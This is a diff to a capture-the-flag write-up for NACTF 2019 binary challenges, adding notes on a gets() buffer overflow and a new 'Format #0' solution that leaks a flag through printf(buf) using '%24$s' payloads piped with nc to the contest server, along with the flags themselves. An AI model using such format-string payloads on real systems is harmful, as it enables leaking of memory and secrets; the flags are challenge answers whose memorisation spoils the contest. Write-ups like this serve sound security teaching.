@@ -339,6 +339,10 @@ Can you cause a segfault and get the flag?
 - [bufover-0.c](Files/bufover-0.c)
 
 #### Solution
+We have BOF here:
+```c
+gets(buf);
+```
 Our target is to call function **win()**. We have a call to **signal()**, it will call **win()** whenever SIGSEGV error occurs.
 ```c
 signal(SIGSEGV, win);
@@ -405,8 +409,8 @@ Can you control the arguments to win() and get the flag?
 > How are arguments passed to a function?
 
 #### File
-- [bufover-1](Files/bufover-1)
-- [bufover-1.c](Files/bufover-1.c)
+- [bufover-2](Files/bufover-2)
+- [bufover-2.c](Files/bufover-2.c)
 
 #### Solution
 Again, we also need to overwrite the **return address** of func **vuln()** into the address of func **win()**.
@@ -433,3 +437,39 @@ flag: nactf{PwN_th3_4rG5_T0o_Ky3v7Ddg}
 
 #### Flag
 `nactf{PwN_th3_4rG5_T0o_Ky3v7Ddg}`
+
+
+***
+
+## Format #0 (200)
+
+#### Description
+> Someone didn't tell Chaddha not to give user input as the first argument to printf() - use it to leak the flag!
+
+> Connect at shell.2019.nactf.com:31782
+
+#### Hint
+> Note the f in printf
+
+#### File
+- [format-0](Files/format-0)
+- [format-0.c](Files/format-0.c)
+
+#### Solution
+We have **Format string** here:
+```c
+printf(buf);
+```
+And flag is in argument of func **vuln()**. So we use format string to leak the flag.
+
+We just need to know the offset of **flag** from **buf**. We can brute force it:
+```bash
+$ echo "%23\$s" | nc shell.2019.nactf.com 31782
+Type something>You typed: ���
+
+$ echo "%24\$s" | nc shell.2019.nactf.com 31782
+Type something>You typed: nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}
+```
+
+#### Flag
+`nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}`
